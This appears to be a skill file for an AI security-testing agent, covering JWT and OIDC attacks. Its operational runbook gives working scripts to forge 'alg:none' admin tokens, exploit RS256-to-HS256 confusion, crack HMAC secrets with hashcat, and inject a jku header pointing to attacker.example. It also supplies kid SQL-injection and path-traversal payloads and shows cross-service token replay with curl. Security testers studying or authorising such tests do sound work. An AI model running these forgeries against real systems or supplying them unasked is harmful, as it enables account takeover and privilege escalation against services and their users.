---
name: authentication-jwt
description: JWT and OIDC security testing covering token forgery, algorithm confusion, and claim manipulation
---

# Authentication / JWT / OIDC

JWT/OIDC failures often enable token forgery, token confusion, cross-service acceptance, and durable account takeover. Do not trust headers, claims, or token opacity without strict validation bound to issuer, audience, key, and context.

## Attack Surface

- Web/mobile/API authentication using JWT (JWS/JWE) and OIDC/OAuth2
- Access vs ID tokens, refresh tokens, device/PKCE/Backchannel flows
- First-party and microservices verification, gateways, and JWKS distribution

## Reconnaissance

### Endpoints

- Well-known: `/.well-known/openid-configuration`, `/oauth2/.well-known/openid-configuration`
- Keys: `/jwks.json`, rotating key endpoints, tenant-specific JWKS
- Auth: `/authorize`, `/token`, `/introspect`, `/revoke`, `/logout`, device code endpoints
- App: `/login`, `/callback`, `/refresh`, `/me`, `/session`, `/impersonate`

### Token Features

- Headers: `{"alg":"RS256","kid":"...","typ":"JWT","jku":"...","x5u":"...","jwk":{...}}`
- Claims: `{"iss":"...","aud":"...","azp":"...","sub":"user","scope":"...","exp":...,"nbf":...,"iat":...}`
- Formats: JWS (signed), JWE (encrypted). Note unencoded payload option (`"b64":false`) and critical headers (`"crit"`)

## Key Vulnerabilities

### Signature Verification

- RS256→HS256 confusion: change alg to HS256 and use the RSA public key as HMAC secret if algorithm is not pinned
- "none" algorithm acceptance: set `"alg":"none"` and drop the signature if libraries accept it
- ECDSA malleability/misuse: weak verification settings accepting non-canonical signatures

### Header Manipulation

- **kid injection**: path traversal `../../../../keys/prod.key`, SQL/command/template injection in key lookup, or pointing to world-readable files
- **jku/x5u abuse**: host attacker-controlled JWKS/X509 chain; if not pinned/whitelisted, server fetches and trusts attacker keys
- **jwk header injection**: embed attacker JWK in header; some libraries prefer inline JWK over server-configured keys
- **SSRF via remote key fetch**: exploit JWKS URL fetching to reach internal hosts

### Key and Cache Issues

- JWKS caching TTL and key rollover: accept obsolete keys; race rotation windows; missing kid pinning → accept any matching kty/alg
- Mixed environments: same secrets across dev/stage/prod; key reuse across tenants or services
- Fallbacks: verification succeeds when kid not found by trying all keys or no keys (implementation bugs)

### Claims Validation Gaps

- iss/aud/azp not enforced: cross-service token reuse; accept tokens from any issuer or wrong audience
- scope/roles fully trusted from token: server does not re-derive authorization; privilege inflation via claim edits when signature checks are weak
- exp/nbf/iat not enforced or large clock skew tolerance; accept long-expired or not-yet-valid tokens
- typ/cty not enforced: accept ID token where access token required (token confusion)

### Token Confusion and OIDC

- Access vs ID token swap: use ID token against APIs when they only verify signature but not audience/typ
- OIDC mix-up: redirect_uri and client mix-ups causing tokens for Client A to be redeemed at Client B
- PKCE downgrades: missing S256 requirement; accept plain or absent code_verifier
- State/nonce weaknesses: predictable or missing → CSRF/logical interception of login
- Device/Backchannel flows: codes and tokens accepted by unintended clients or services

### Refresh and Session

- Refresh token rotation not enforced: reuse old refresh token indefinitely; no reuse detection
- Long-lived JWTs with no revocation: persistent access post-logout
- Session fixation: bind new tokens to attacker-controlled session identifiers or cookies

### Transport and Storage

- Token in localStorage/sessionStorage: susceptible to XSS exfiltration; cookie vs header trade-offs with SameSite/CSRF
- Insecure CORS: wildcard origins with credentialed requests expose tokens and protected responses
- TLS and cookie flags: missing Secure/HttpOnly; lack of mTLS or DPoP/"cnf" binding permits replay from another device

## Advanced Techniques

### Microservices and Gateways

- Audience mismatch: internal services verify signature but ignore aud → accept tokens for other services
- Header trust: edge or gateway injects X-User-Id; backend trusts it over token claims
- Asynchronous consumers: workers process messages with bearer tokens but skip verification on replay

### JWS Edge Cases

- Unencoded payload (b64=false) with crit header: libraries mishandle verification paths
- Nested JWT (JWT-in-JWT) verification order errors; outer token accepted while inner claims ignored

## Special Contexts

### Mobile

- Deep-link/redirect handling bugs leak codes/tokens; insecure WebView bridges exposing tokens
- Token storage in plaintext files/SQLite/Keychain/SharedPrefs; backup/adb accessible

### SSO Federation

- Misconfigured trust between multiple IdPs/SPs, mixed metadata, or stale keys lead to acceptance of foreign tokens

## Chaining Attacks

- XSS → token theft → replay across services with weak audience checks
- SSRF → fetch private JWKS → sign tokens accepted by internal services
- Host header poisoning → OIDC redirect_uri poisoning → code capture
- IDOR in sessions/impersonation endpoints → mint tokens for other users

## Operational Runbook

Once a JWT is captured (typically from an `Authorization: Bearer <token>` header), this is the canonical attack flow. Tools: [`jwt_tool.py`](https://github.com/ticarpi/jwt_tool), `python-jose`, plain `python3 -c`, and `hashcat -m 16500` for offline crack.

### Step 1 — decode + classify

```bash
# Decode header + claims (no verification — just base64 decode)
TOKEN='eyJhbGciOi...'
python3 -c "
import base64, json, sys
hdr, payload, sig = sys.argv[1].split('.')
def d(s): return json.loads(base64.urlsafe_b64decode(s + '=='*(-len(s)%4)))
print('HEADER:', json.dumps(d(hdr), indent=2))
print('CLAIMS:', json.dumps(d(payload), indent=2))
" "$TOKEN"
```

Note: `alg`, `typ`, `kid`, `iss`, `aud`, `sub`, `exp`, `iat`. Each is a probe target.

### Step 2 — `alg: none` (the classic)

```bash
# Construct a forged token with alg=none and an elevated claim
python3 << 'PYEOF'
import base64, json
hdr = {"alg":"none","typ":"JWT"}
claims = {"sub":"admin","role":"admin","iss":"<issuer>","aud":"<aud>","exp":9999999999}
b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(f"{b(hdr)}.{b(claims)}.")  # trailing dot, empty signature
PYEOF

# Replay against the target
curl -s '<TARGET>/api/admin' -H "Authorization: Bearer <forged-token>"
```

If response is 2xx → server accepts unsigned tokens. **Critical**.

### Step 3 — algorithm confusion (RS256 → HS256)

The server expects an RSA-signed token but is tricked into using the public key as an HMAC secret:

```bash
# 1. Fetch the public key
curl -s '<TARGET>/.well-known/jwks.json' > /tmp/jwks.json
PUB=$(jq -r '.keys[0].n' /tmp/jwks.json)

# 2. Build the public key in PEM format (jwt_tool handles this)
jwt_tool.py "$TOKEN" -X k -pk /tmp/pubkey.pem

# Or manually with python-jose
python3 << 'PYEOF'
from jose import jwt
pem = open('/tmp/pubkey.pem').read()
forged = jwt.encode(
    {"sub":"admin","role":"admin","iss":"<issuer>","aud":"<aud>","exp":9999999999},
    pem, algorithm='HS256',
)
print(forged)
PYEOF
```

### Step 4 — weak HMAC secret (offline crack)

If `alg=HS256` and the server uses a guessable secret:

```bash
# Convert token to hashcat format
echo -n "<header>.<payload>" > /tmp/jwt_msg
# Extract signature bytes — hashcat mode 16500 takes the whole token
echo "$TOKEN" > /tmp/jwt.txt

hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

A cracked secret means you can mint any token. **Critical** finding.

### Step 5 — `jku` / `jwk` / `x5u` header injection

Point the server at an attacker-controlled JWKS:

```bash
# Host a JWKS file on an attacker server
cat > /tmp/attacker_jwks.json <<'JSON'
{"keys": [{"kty":"RSA","kid":"attacker","use":"sig","n":"<your-pubkey-modulus>","e":"AQAB"}]}
JSON

# Forge a token whose header points to your JWKS
python3 << 'PYEOF'
import jwt
priv = open('/tmp/attacker.priv').read()
token = jwt.encode(
    {"sub":"admin","role":"admin","exp":9999999999},
    priv, algorithm='RS256',
    headers={"jku":"https://attacker.example/jwks.json","kid":"attacker"},
)
print(token)
PYEOF

# Replay; if server fetches the JWKS and validates the token → bypass
```

### Step 6 — claim mutation (audit logging may reveal blind acceptance)

Try changing claims with valid signature still intact — sometimes the server doesn't actually check `exp`, `nbf`, `aud`, `iss`:

```bash
# Forge: bump exp far into the future
# Bonus: try invalid signature — does server accept anyway?
jwt_tool.py "$TOKEN" -T  # tampering mode

# Specific common bugs to check:
# - exp far in the past: server should reject; if it accepts → no exp check
# - aud=https://different-service: should reject; if accepts → no aud check
# - iss=https://attacker: should reject; if accepts → no iss check
# - kid set to ../../etc/passwd or SQLi payload: probes for kid path-traversal / SQLi
```

### Step 7 — `kid` SQLi / path traversal

`kid` is sometimes used as a database lookup or file path:

```bash
# SQLi in kid
jwt_tool.py "$TOKEN" -I -hc kid -hv "x' UNION SELECT 'attacker_secret'--"

# Path traversal in kid
jwt_tool.py "$TOKEN" -I -hc kid -hv "../../../../dev/null"
# An empty/null key may allow signing with empty string
```

### Step 8 — replay across services

Even with a valid signature, the token may be accepted by services it wasn't issued for:

```bash
# Capture token issued for service A; replay against service B
curl -s '<SERVICE_B>/api/admin' -H "Authorization: Bearer $SERVICE_A_TOKEN"

# Many APIs only check signature, not aud → cross-service replay
```

Document: which `aud` was issued, which services accepted, which rejected.

## Testing Methodology

1. **Inventory issuers/consumers** - Identity providers, API gateways, services, mobile/web clients
2. **Capture tokens** - Access and ID tokens for multiple roles; note header, claims, signature
3. **Map verification endpoints** - `/.well-known`, `/jwks.json`
4. **Build matrix** - Token Type × Audience × Service; attempt cross-use
5. **Mutate components** - Headers (alg, kid, jku/x5u/jwk), claims (iss/aud/azp/sub/exp), signatures
6. **Verify enforcement** - What is actually checked vs assumed

## Validation

1. Show forged or cross-context token acceptance (wrong alg, wrong audience/issuer, or attacker-signed JWKS)
2. Demonstrate access token vs ID token confusion at an API
3. Prove refresh token reuse without rotation detection or revocation
4. Confirm header abuse (kid/jku/x5u/jwk) leading to key selection under attacker control
5. Provide owner vs non-owner evidence with identical requests differing only in token context

## False Positives

- Token rejected due to strict audience/issuer enforcement
- Key pinning with JWKS whitelist and TLS validation
- Short-lived tokens with rotation and revocation on logout
- ID token not accepted by APIs that require access tokens

## Impact

- Account takeover and durable session persistence
- Privilege escalation via claim manipulation or cross-service acceptance
- Cross-tenant or cross-application data access
- Token minting by attacker-controlled keys or endpoints

## Pro Tips

1. Pin verification to issuer and audience; log and diff claim sets across services
2. Attempt RS256→HS256 and "none" first only if algorithm pinning is unclear; otherwise focus on header key control (kid/jku/x5u/jwk)
3. Test token reuse across all services; many backends only check signature, not audience/typ
4. Exploit JWKS caching and rotation races; try retired keys and missing kid fallbacks
5. Exercise OIDC flows with PKCE/state/nonce variants and mixed clients; look for mix-up
6. Try DPoP/mTLS absence to replay tokens from different devices
7. Treat refresh as its own surface: rotation, reuse detection, and audience scoping
8. Validate every acceptance path: gateway, service, worker, WebSocket, and gRPC
9. Favor minimal PoCs that clearly show cross-context acceptance and durable access
10. When in doubt, assume verification differs per stack (mobile vs web vs gateway) and test each

## Summary

Verification must bind the token to the correct issuer, audience, key, and client context on every acceptance path. Any missing binding enables forgery or confusion.
